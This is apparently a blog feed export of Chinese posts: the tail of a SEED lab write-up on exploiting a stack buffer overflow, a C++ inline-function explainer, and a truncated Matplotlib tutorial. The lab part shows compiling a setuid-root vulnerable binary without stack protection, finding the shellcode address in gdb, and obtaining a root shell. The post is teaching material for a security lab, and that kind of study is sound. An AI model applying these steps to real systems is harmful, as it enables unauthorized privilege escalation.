class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><blockquote><p>还有一种替代解决方案是更改<code>shellcode</code>中<code>&quot;\x68&quot;&quot;//sh&quot;</code>为<code>&quot;\x68&quot;&quot;/zsh&quot;</code></p></blockquote></li></ul><h2 id="以root身份编译漏洞程序"><a href="#以root身份编译漏洞程序" class="headerlink" title="以root身份编译漏洞程序"></a>以root身份编译漏洞程序</h2><p>确保程序有<code>root</code>权限<br><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">sudo gcc -g -z execstack -fno-stack-protector -o stack stack.csudo chmod u+s stack<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div></p><h2 id="确定shellcode在内存中位置"><a href="#确定shellcode在内存中位置" class="headerlink" title="确定shellcode在内存中位置"></a>确定<code>shellcode</code>在内存中位置</h2><p>注意<code>shellcode</code>本质是被放在<code>badfile</code>文件中，而漏洞程序读取<code>badfile</code>复制到<code>buffer</code>数组中，那么<code>badfile</code>的起始位置就是<code>stack.c</code>中<code>buffer</code>的起始位置，因此我们需要让<code>shellcode</code>的地址刚好被写在漏洞程序函数<code>bof</code>返回地址的位置。具体如下图：<br><img src="https://img-blog.csdnimg.cn/20200929171137106.png#pic_center" style="zoom:50%;" /><br>用<code>gdk</code>调试<code>stack</code>，反汇编<code>main</code>函数，如下：</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">gdb stackdisass main<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/20200929171437517.png#pic_center" alt=""><br>注意红框处的操作，这是main函数执行后栈给局部变量留出的空间，然后我们查看<code>str</code>的地址，<code>shellcode</code>应该已经被放置在<code>str</code>数组中，距离100的位置。<br>随意找个地方设置断点，并运行，接着查看<code>str</code>的地址，并计算+100后的地址结果</p><div class="code-wrapper"><pre class="line-numbers language-none"><code class="language-none">b *0x080484afrp &amp;strp&#x2F;x 0xbffff127+100<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></div><p><img src="https://img-blog.csdnimg.cn/20200930122635574.png#pic_center" alt=""></p><p>在<code>exploit.c</code>中将<code>\x?\x?\x?\x?</code>的部分用<code>0xbffff18b</code>地址替换<br><img src="https://img-blog.csdnimg.cn/20200930123010982.png#pic_center" alt=""></p><h2 id="执行攻击程序"><a href="#执行攻击程序" class="headerlink" title="执行攻击程序"></a>执行攻击程序</h2><p>对攻击程序编译并执行得到<code>badfile</code>,再执行<code>./stack</code>查看攻击效果。<br><img src="https://img-blog.csdnimg.cn/20200930123207297.png#pic_center" alt=""><br>发现指令非法，说明我们没有正确找到<code>shellcode</code>指令地址。</p><blockquote><p>这个地方困扰了我很久，是个大坑，后来发现一篇文章中写到<code>gdb的调试环境会影响buf在内存中的位置，虽然我们关闭了ASLR，但这只能保证buf的地址在gdb的调试环境中不变，但当我们直接执行./stack的时候，buf的位置会固定在别的地址上。</code>。</p></blockquote><p>即存放<code>shellcode</code>的地址相比原来会有偏差，因此尝试在找到的<code>shellcode</code>地址上进行偏移，这里我尝试了许多种，发现将<code>8b</code>换成<code>ab</code>是可行的。<br><img src="https://img-blog.csdnimg.cn/20200930123530378.png#pic_center" alt=""><br>再做一次攻击可发现获取到了root权限<br><img src="https://img-blog.csdnimg.cn/20200930123642159.png#pic_center" alt=""></p><blockquote><p>说明<code>shllcode</code>实际执行相比于调试内存地址偏后了30多位，可以尝试将<code>8b</code>修改成更后面或附近的数值，如<code>af</code>,<code>b4</code>都是可行的。</p></blockquote><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>缓冲区溢出是十分古老却又经典的程序漏洞，许多更近一步的如<code>return-to-libc</code>,<strong>格式化字符串漏洞</strong>，都是基于此基础上做的进一步深入攻击，因此掌握最基础的<code>stack overflow</code>还是很有必要的。这个地方我参考了许多网上许多教程，它们大部分都是调试阶段直接获取到<code>str</code>或者<code>esp</code>地址后通过计算相对位置得到<code>shellcode</code>地址，但根据我的实际操作结果来看有较大出入，实践才是检验真理的唯一标准。参考资料里列举的都是与此实验相关的资料，供读者对比参考。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://blog.csdn.net/zengxyuyu/article/details/53150521">SEED实验:缓冲区溢出漏洞实验__网络攻防实验</a></li><li><a href="https://www.freebuf.com/vuls/221081.html">SEED：缓冲区溢出漏洞实验</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>overflow</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>【C++】10分钟搞懂内联函数</title>
    <link href="/article/64960.html"/>
    <url>/article/64960.html</url>
    
    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p><strong>内联函数</strong>是<code>C++</code>特有的一种函数，通过添加关键字<code>inline</code>到函数定义前，实现将普通函数转换为内联函数。本文旨在从以下几个方面通俗地讲解内联函数，帮助小白轻松理解和使用内联函数。</p><ol><li>内联函数是啥</li><li>内联函数有啥用</li><li>啥情况下使用内联函数  </li></ol><h1 id="内联函数是啥"><a href="#内联函数是啥" class="headerlink" title="内联函数是啥"></a>内联函数是啥</h1><p>直接先上定义：</p><ul><li>定义：以<code>inline</code>关键字修饰定义的一类函数，让编译器用函数代码替换函数调用  </li></ul><p>听着有点玄乎，看下面一个实例：</p><ul><li>实例：    <div class="code-wrapper"><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token keyword">int</span> a<span class="token punctuation">,</span> <span class="token keyword">int</span> b<span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">return</span> a <span class="token operator">></span> b <span class="token operator">?</span> a<span class="token operator">:</span>b<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">int</span> a <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">,</span>b<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">;</span>cout<span class="token operator">&lt;&lt;</span><span class="token function">max</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>  <span class="token comment">// &lt;=> cout&lt;&lt;a > b ? a:b&lt;&lt;endl;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div>哦豁，内联函数做的事情就是在程序调用的时候把代码更换了。所有上面<code>cout&lt;&lt;max(a,b)&lt;&lt;endl;</code>的效果等价于<code>cout&lt;&lt;a &gt; b ? a:b&lt;&lt;endl;</code>。</li></ul><p>除了上面的定义方式，还有类内的函数会被隐式定义成内联函数，具体如下：<br><div class="code-wrapper"><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 声明1（加 inline，建议使用），光声明无法内联，需要在定义中添加inline</span><span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">functionName</span><span class="token punctuation">(</span><span class="token keyword">int</span> first<span class="token punctuation">,</span> <span class="token keyword">int</span> second<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 声明2（不加 inline）</span><span class="token keyword">int</span> <span class="token function">functionName</span><span class="token punctuation">(</span><span class="token keyword">int</span> first<span class="token punctuation">,</span> <span class="token keyword">int</span> second<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 定义</span><span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token function">functionName</span><span class="token punctuation">(</span><span class="token keyword">int</span> first<span class="token punctuation">,</span> <span class="token keyword">int</span> second<span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token comment">/****/</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 类内定义，隐式内联</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> <span class="token function">doA</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>         <span class="token comment">// 隐式内联</span><span class="token punctuation">&#125;</span><span class="token comment">// 类外定义，需要显式内联</span><span class="token keyword">class</span> <span class="token class-name">A</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> <span class="token function">doA</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">inline</span> <span class="token keyword">int</span> <span class="token class-name">A</span><span class="token operator">::</span><span class="token function">doA</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>   <span class="token comment">// 需要显式内联</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p><p>这样又有什么用呢？</p><h1 id="内联函数有啥用"><a href="#内联函数有啥用" class="headerlink" title="内联函数有啥用"></a>内联函数有啥用</h1><p>对比内联函数和普通函数，在效果上两者实现一致，但是在效率上内联函数要更胜一筹。究其原因，需要先理解函数调用的过程：</p><ul><li>函数调用过程</li></ul><ol><li>程序需要存储当前地址，以便调用结束后返回继续执行</li><li>程序将传入函数的参数压栈</li><li>程序跳到跳到标记函数起点的内存单元，执行函数代码</li><li>函数调用结束后，将栈清空，返回到之前存储的地址继续执行</li></ol><p>而内联函数就简单多了，相当于直接<code>copy</code>一份函数体内代码，在执行到的时候直接按照代码顺序执行，省去了许多函数调用过程，节省了时间。</p><p>诶，是不是和<strong>宏</strong>有点像啊，例如我们下面的宏定义：<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MAX</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>  a<span class="token operator">></span>b<span class="token operator">?</span><span class="token operator">:</span>a<span class="token operator">:</span>b</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>实现了和我们上面例子一样的效果。</p><p>那为什么不直接用宏？还要整个内联函数。首先，宏能够表达的意思有限，通常是一行的表达式。其次，用宏的安全性不高，容易出错。</p><p>还是上面的例子，假设定义宏如下：<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MAX</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span>  a<span class="token operator">></span>b<span class="token operator">?</span><span class="token operator">:</span>a<span class="token operator">:</span>b</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>那么语句<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">res <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>会被预处理器扩展为<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">res <span class="token operator">=</span> i <span class="token operator">></span> j<span class="token operator">?</span> i<span class="token operator">:</span>j<span class="token operator">+</span><span class="token number">2</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>由于+的优先级高于？，因此最终比较结果与我们期望不符。<br>那如果把宏修改为<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">MAX</span><span class="token expression"><span class="token punctuation">(</span>a<span class="token punctuation">,</span>b<span class="token punctuation">)</span> <span class="token punctuation">(</span>i <span class="token operator">></span> j<span class="token operator">?</span> i<span class="token operator">:</span>j<span class="token punctuation">)</span></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>仍然存在问题，例如<br><div class="code-wrapper"><pre class="line-numbers language-c" data-language="c"><code class="language-c">res <span class="token operator">=</span> <span class="token function">MAX</span><span class="token punctuation">(</span>i<span class="token operator">++</span><span class="token punctuation">,</span>j<span class="token punctuation">)</span>res <span class="token operator">=</span> <span class="token punctuation">(</span>i<span class="token operator">++</span> <span class="token operator">&lt;</span> j<span class="token operator">?</span> i<span class="token operator">++</span><span class="token operator">:</span>j<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// i被+了两次</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></div><br>同时，宏无法调试，但内联函数可以。在程序的调试版本，内联函数并没有真正内联，就像普通函数一样实现调试，在程序的发行版本，编译器才会实现真正内联。</p><p>由此，我们得到内联函数的几个作用：</p><ol><li>提升代码执行效率，不需要跳转进行函数调用，省去参数压栈、栈帧开辟与回收，结果返回等。</li><li>相比于宏，有类型检查，安全性更高，具有一般函数特性，可调试</li></ol><h1 id="啥情况下使用内联函数"><a href="#啥情况下使用内联函数" class="headerlink" title="啥情况下使用内联函数"></a>啥情况下使用内联函数</h1><p>既然内联函数那么好，全部函数改成内联函数不好吗？内联函数虽然省略了函数的一般步骤，但其每次调用都会copy一份副本的特性使得整体函数代码数量增加，消耗更多空间。</p><p>下面的情况不适合使用内联：</p><ol><li>函数体代码过长，内联会使得代码膨胀过大</li><li>函数体内存在循环或其他复杂结构，执行函数体内代码的开销远大于函数调用，没必要内联</li></ol><p>个人理解，内联函数应该被视作简易工具函数，对于一些重复利用率高，代码数量较少的功能（例如比大小，交换位置），可以采用内联提高效率。</p><p>另外，内联函数应当放在头文件(*.h)中，一方面可以和源文件的功能函数分离，另一方面方便被所有源文件使用（不需要每个源文件一份拷贝）。</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ul><li><a href="https://blog.csdn.net/BjarneCpp/article/details/76044493">https://blog.csdn.net/BjarneCpp/article/details/76044493</a></li><li><a href="https://interview.huihut.com/#/?id=inline-%e5%86%85%e8%81%94%e5%87%bd%e6%95%b0">https://interview.huihut.com/#/?id=inline-%e5%86%85%e8%81%94%e5%87%bd%e6%95%b0</a></li></ul>]]></content>
    
    
    <categories>
      
      <category>c++</category>
      
    </categories>
    
    
    <tags>
      
      <tag>c++</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《Python绘图利器》：Matplotlib使用教程</title>
    <link href="/article/65005.html"/>
    <url>/article/65005.html</url>
    
    <content type="html"><![CDATA[<h1 id="1-前言"><a href="#1-前言" class="headerlink" title="1. 前言"></a>1. 前言</h1><p>本文是Matplotlib库的学习使用文章，包含<code>Matplotlib</code>的介绍，安装以及如何绘图等详细的教程。也可以作为<code>Matplotlib</code>绘图手册，在需要的使用翻阅查看。 </p><h1 id="2-Matplotlib简介"><a href="#2-Matplotlib简介" class="headerlink" title="2. Matplotlib简介"></a>2. Matplotlib简介</h1><p><code>Matplotlib</code>受<code>Matlab</code>启发（绘图方式十分相似），由各种可视化类构成，其内部结构十分复杂，为了方便用户使用，提供了<code>Matplotlib.pyplot</code>作为python绘图的子库，提供绘制各类可视化图形的命令。</p><blockquote><p><code>pyplot</code>相当于提供了底层绘图的一个快捷方式，用简单的方式去调用复杂模块  </p></blockquote><p>一般情况下，我们采用如下的方式导入<code>pyplot</code><br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div><br>下面展示了Matplotlib绘制的部分图形：<br><img src="https://img-blog.csdnimg.cn/20200306111922750.png#pic_center =500x500" style="zoom:50%;" /></p><h1 id="3-安装"><a href="#3-安装" class="headerlink" title="3. 安装"></a>3. 安装</h1><p><code>Matplotlib</code>的安装十分简单，只要本地安装了<code>python</code>环境和<code>pip</code>安装工具，用下面的命令即可安装:<br><div class="code-wrapper"><pre class="line-numbers language-text" data-language="text"><code class="language-text">pip install matplotlib<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p><h1 id="4-绘图基础"><a href="#4-绘图基础" class="headerlink" title="4. 绘图基础"></a>4. 绘图基础</h1><h2 id="4-1-plot-函数"><a href="#4-1-plot-函数" class="headerlink" title="4.1 plot()函数"></a>4.1 plot()函数</h2><p><code>plot(x,y,format_string,**kwargs)</code>是<code>pyplot</code>绘图的基础函数，其中各参数含义如下: </p><ul><li><code>x</code>:X轴数据，列表或数组(单条曲线可选)</li><li><code>y</code>:Y轴数据，列表或数组</li><li><code>format_string</code>:控制曲线的格式字符串，用于填充曲线信息(可选)，包含<strong>颜色，风格，标记</strong>三种字符，对应可选参数如下：<table><tr><td><strong>字符类型</strong></td><td><strong>参数</strong></td><td><strong>说明</strong></td></tr><tr>                                   <td rowspan="10">颜色字符</td>  <td>'b'</td>  <td>蓝色</td></tr><tr>                                   <td>'g'</td>  <td>绿色</td></tr><tr>                                   <td>'r'</td>  <td>红色</td></tr> <tr>                                   <td>'c'</td>  <td>青绿色</td></tr> <tr>                                   <td>'m'</td>  <td>洋红色</td></tr><tr>                                   <td>'y'</td>  <td>黄色</td></tr><tr>                                   <td>'k'</td>  <td>黑色</td></tr><tr>                                   <td>'w'</td>  <td>白色</td></tr><tr>                                   <td>'#000000'</td>  <td>按RGB取色</td></tr><tr>                                   <td>'0.6'</td>  <td>灰度值</td></tr><tr>                                   <td rowspan="5">风格字符</td>  <td>'-'</td>  <td>实线</td></tr><tr>                                   <td>'--'</td>  <td>破折线</td></tr><tr>                                   <td>'-.'</td>  <td>点划线</td></tr><tr>                                   <td>':'</td>  <td>虚线</td></tr><tr>                                   <td>'' ''</td>  <td>无线条</td></tr><tr>                                   <td rowspan="3">标记字符</td>  <td>'.'</td>  <td>点标记</td></tr><tr>                                   <td>'o'</td>  <td>实心圈标记</td></tr><tr>                                   <td>'^'</td>  <td>上三角标记</td></tr> </table></li></ul><blockquote><p>标记字符还有很多种类型，这里不一一列出，下面是几个曲线样例:<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>x<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'b-.'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>x<span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'r*'</span><span class="token punctuation">,</span>x<span class="token punctuation">,</span>x<span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">'y-.^'</span><span class="token punctuation">)</span>  <span class="token comment"># 1:蓝色实线点标记，2:红色`*`标记，3:黄色虚线上三角标记</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><img src="https://img-blog.csdnimg.cn/20200306112029442.png#pic_center =500x400" style="zoom:50%;" /></p></blockquote><ul><li><code>**kwargs</code>:更多的曲线参数(x,y,format_string)   </li></ul><h3 id="4-1-1-中文显示"><a href="#4-1-1-中文显示" class="headerlink" title="4.1.1 中文显示"></a>4.1.1 中文显示</h3><p><code>pyplot</code>标签本身并不支持中文字体，可以通过在label中添加<code>fontproperties</code>属性修改字体，<code>fontsize</code>设置字体大小，但首先需要保证有对应字体，如果提示没有，则需下载并进行安装，具体可以参考<a href="https://blog.csdn.net/q1148013214/article/details/81172446">这篇文章</a>。</p><blockquote><p>jupyter 需要重启一下服务显示</p></blockquote><p>中文显示样例如下：<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'我是横轴'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'Simhei'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'我是纵轴'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'Simhei'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>x<span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'b-.'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div></p><p><img src="https://img-blog.csdnimg.cn/2020030611205413.png#pic_center =500x400" style="zoom:50%;" /></p><blockquote><p>显示中文标签的方法还有修改<code>rcParams</code>参数，但这种方式是全局式的修改，统一所有字体，根据自身需要取舍。实现也很容易，在程序开头添加如下代码：<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python">plt<span class="token punctuation">.</span>rcParams<span class="token punctuation">[</span><span class="token string">'font.sans-serif'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'SimHei'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></div></p></blockquote><h3 id="4-1-2-文本显示"><a href="#4-1-2-文本显示" class="headerlink" title="4.1.2 文本显示"></a>4.1.2 文本显示</h3><p>除了绘图之外，我们还需要给图像做一定的说明文字信息，一般包括如下几个文本显示函数：</p><div class="table-container"><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>plt.xlabel()</td><td>x轴文字</td></tr><tr><td>plt.ylabel()</td><td>y轴文字</td></tr><tr><td>plt.title()</td><td>图像标题文本</td></tr><tr><td>plt.text()</td><td>任意位置添加文本</td></tr><tr><td>plt.annotate()</td><td>添加带箭头的注释</td></tr></tbody></table></div><p>下面是一个较为详细的例子：<br><div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np<span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltx <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'我是横轴'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'r'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'我是纵轴'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'正弦曲线$y=sin(2\pi x)$'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>text<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'(5,1)'</span><span class="token punctuation">,</span>fontsize<span class="token operator">=</span><span class="token number">12</span><span class="token punctuation">)</span>  <span class="token comment"># 在(5,1)处添加文本信息</span>plt<span class="token punctuation">.</span>annotate<span class="token punctuation">(</span><span class="token string">'看这里'</span><span class="token punctuation">,</span>xy<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span>xytext<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1.5</span><span class="token punctuation">)</span><span class="token punctuation">,</span>               arrowprops<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">'facecolor'</span><span class="token punctuation">:</span><span class="token string">'k'</span><span class="token punctuation">,</span><span class="token string">'shrink'</span><span class="token punctuation">:</span><span class="token number">0.1</span><span class="token punctuation">,</span><span class="token string">'width'</span><span class="token punctuation">:</span><span class="token number">1.5</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>  <span class="token comment"># 设置指示箭头</span>plt<span class="token punctuation">.</span>ylim<span class="token punctuation">(</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span>  <span class="token comment"># 设置y轴上下限</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>np<span class="token punctuation">.</span>sin<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token operator">*</span>x<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'b-.'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>  <span class="token comment"># 显示网格</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></div><br><img src="https://img-blog.csdnimg.cn/20200306112151427.png#pic_center =500x400" style="zoom:50%;" /></p><h1 id="5-常用图表绘制"><a href="#5-常用图表绘制" class="headerlink" title="5. 常用图表绘制"></a>5. 常用图表绘制</h1><p>前文已经说明了一般的曲线图绘制，本章讲述其他几种常用的图表绘制方法，每个图表都将先给一个简单的绘图样例（用于快速查询绘制），再详细讲解函数参数信息并给出更为丰富的绘制方法与效果。</p><h2 id="5-1-直方图"><a href="#5-1-直方图" class="headerlink" title="5.1 直方图"></a>5.1 直方图</h2><blockquote><p><strong>适用数值对比</strong>  </p></blockquote><h3 id="5-1-1-简单样例"><a href="#5-1-1-简单样例" class="headerlink" title="5.1.1 简单样例"></a>5.1.1 简单样例</h3><ul><li><strong>效果</strong><br>  <img src="https://img-blog.csdnimg.cn/20200306112151427.png#pic_center =500x400" style="zoom:50%;" /></li><li><strong>代码</strong>     <div class="code-wrapper"><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> npx <span class="token operator">=</span> np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randint<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span>  bins <span class="token operator">=</span> np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">51</span><span class="token punctuation">,</span><span class="token number">10</span><span class="token punctuation">)</span>  <span class="token comment"># 设置直方图分布区间[0-50],10为间距</span>plt<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>x<span class="token punctuation">,</span>bins<span class="token punctuation">,</span>color<span class="token operator">=</span><span class="token string">"darkgreen"</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'学生成绩分布图'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'成绩'</span><span class="token punctuation">,</span>fontproperties<span class="token operator">=</span><span class="token string">'SimHei'</span><span class="token punctuation">,</span> fontsize<span class="token operator">=</span><span class="token number">15</span><span class="token punctuation">)</span>plt<span class="token 